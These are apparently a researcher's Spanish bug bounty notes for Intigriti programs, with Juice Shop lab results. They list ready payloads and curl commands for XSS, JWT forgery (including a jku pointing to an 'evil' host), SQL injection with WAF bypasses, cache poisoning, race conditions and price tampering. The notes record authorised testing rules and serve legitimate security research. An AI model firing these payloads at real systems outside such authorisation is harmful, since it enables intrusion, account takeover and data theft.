# Catalogo Técnicas Bug Bounty 2026 (mrpuff0420) — Sesion 2

Consolidado de investigación (web_search + sub-agente READ-ONLY) y práctica lab (Juice Shop).
Headers REALES según RoE: DPG `X-Intigriti-Username: mrpuff0420`, Aikido `X-Intigriti: mrpuff0420`.
Rate limit 5 req/seg (sleep 0.2s). DPG PROHIBE scanners -> todo manual.

## 1. XSS avanzado — DPG: stored=High, reflected=Medium
- mXSS (CVE-2024-47875 DOMPurify<3.1.3): `<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>`
- DOM clobbering (CVE-2025-1647 Bootstrap3): clobber `document.implementation.createHTMLDocument` para saltar sanitizer.
- Prototype pollution->XSS: `Object.prototype.innerHTML='<img src=x onerror=alert(1)>'`; sinks $.extend, lodash _.merge.
- SVG upload: `.svg` con `<script>`/`<svg onload>`; verificar Content-Type inline sin CSP.
- CSP bypass: `<svg><animate onbegin=eval(atob('...'))>` con unsafe-eval.
- Paso: `curl -H "X-Intigriti-Username: mrpuff0420" -F "file=@poc.svg" https://target/upload`
- 🚩 XSS en /abonnementen = out-of-scope/duplicado DPG.

## 2. Auth/JWT — DPG: auth bypass=High
- alg:none: header `{"alg":"none"}` sin firma.
- RS256->HS256 confusion: firmar HS256 con clave pública RSA como secreto.
- kid path traversal: `kid:"../../../dev/null"` + HS256 clave vacía.
- JKU/JWKU injection: `jku:https://evil/jwks.json`.
- CVE-2022-21449 (Psychic Signatures): ECDSA r=0,s=0 acepta firma nula (Java 15-18).
- Refresh token reuse: reusar refresh viejo tras rotación.
- Paso: `curl -H "X-Intigriti-Username: mrpuff0420" -H "Authorization: Bearer ***" https://target/api/me` (200 vs 401).
- 🚩 Confusión cuenta solo si 200 refleja identidad cambiada (sub/role).

## 3. SQLi — DPG: Critical
- WAF bypass: `un/**/ion+se/**/lect`, doble-encoding `%2555NION`, `%0b` whitespace, JSON-SQLi.
- Time-based blind (throttle-safe): `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--` 1 req confirma.
- Second-order: inyectar en registro/perfil re-consultado en otro endpoint.
- Paso: `curl -H "X-Intigriti-Username: mrpuff0420" "https://target/item?id=1'%20AND%20SLEEP(5)--%20"` (1 par de req, NO barras).
- 🚩 NO sqlmap (=scanner, ban DPG). Lab: `')) UNION SELECT sql,... FROM sqlite_master--` -> schema leak OK.

## 4. Race condition / TOCTOU
- Limit overrun (single-packet): cupón/límite reusado con N req paralelas [PortSwigger; Stripe $600k].
- Vectores: coupon reuse, transferencia sobre saldo, role upgrade, password-reset token.
- Paso: Burp Repeater grupo `POST /cart/coupon` -> Send in parallel. curl HTTP/2 ~20 req simultáneas.
- 🚩 Reportar con impacto financiero concreto.

## 5. Business logic
- Negative quantity: `qty:-1` resta del total (caso €408->€3.60).
- Price/cart manipulation, discount stacking.
- Paso: interceptar `POST /checkout`, editar `qty=-1`/`price`, reenviar con header Intigriti.
- 🚩 Si server recalcula server-side = no bug.

## 6. Web cache — DPG CPDoS / Aikido
- Cache poisoning unkeyed: `X-Forwarded-Host: evil.com` reflejado y cacheado.
- Cache deception: path confusion `/account/profile.css` sirve datos privados desde caché.
- CPDoS: `X-HTTP-Method-Override` -> 405 cacheable sobre chunk JS Next.js.
- Paso: `curl -H "X-Intigriti-Username: mrpuff0420" -H "X-Forwarded-Host: evil.com" "https://target/?cb=1"` revisar Age/reflejo en 2ª petición.

## Red flags duplicado/out-of-scope (DPG)
- Scanners -> rechazo. UUID IDOR sin enumeración = no pagable. XSS /abonnementen = dup/OOS.
- DPG comparte codebase 14 marcas -> 1 issue multi-marca.

## Practica lab realizada (Juice Shop)
- SQLi search -> schema leak (200) ✅
- IDOR /api/Users/{id} customer->admin ✅
- Stored XSS POST /api/Products 201 (pending confirmar render) 
- Auth bypass remember-me concept documentado
